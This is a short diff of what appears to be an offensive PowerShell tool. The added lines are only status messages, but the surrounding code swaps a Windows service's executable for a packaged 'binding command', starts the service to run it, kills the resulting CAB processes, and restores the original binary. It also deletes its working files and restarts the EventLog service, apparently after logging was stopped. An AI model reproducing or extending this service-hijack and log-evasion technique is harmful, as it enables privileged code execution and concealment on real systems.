@@ -113,6 +113,7 @@ $resultado += "`n[+] Binding command with service."
 Copy-Item $nombre_objetivo  $nombre_objetivo_bkp 
 Copy-Item $nombre_final $nombre_objetivo 
 Start-Service -Name $service_name 
+$resultado += "`n[+] Start-Service with the binding command."
 Stop-Service -Name $service_name 
 do {
 
@@ -124,13 +125,16 @@ $get_process = Get-Process -Name $process_name ; foreach ($killprocess in $get_p
 if (($killprocess | Select-Object -Property *).description -like "*CAB*"){ $killprocess | Stop-Process -Force}
 
 }
+
+$resultado += "`n[+] Stop-Service with the binding command."
 taskkill /f /im $nombre_objetivo
 Copy-Item $nombre_objetivo_bkp $nombre_objetivo 
 Remove-Item $archivo_sed
 Remove-Item $nombre_final
 Remove-Item $nombre_objetivo_bkp 
+$resultado += "`n[+] Restoring the service to its original state."
 Start-Service -Name $service_name
 start-Service -Name EventLog 
-$resultado += "`n[+] Script executed succefully"
+$resultado += "`n[+] Script executed succefully !!"
 return $resultado
 }
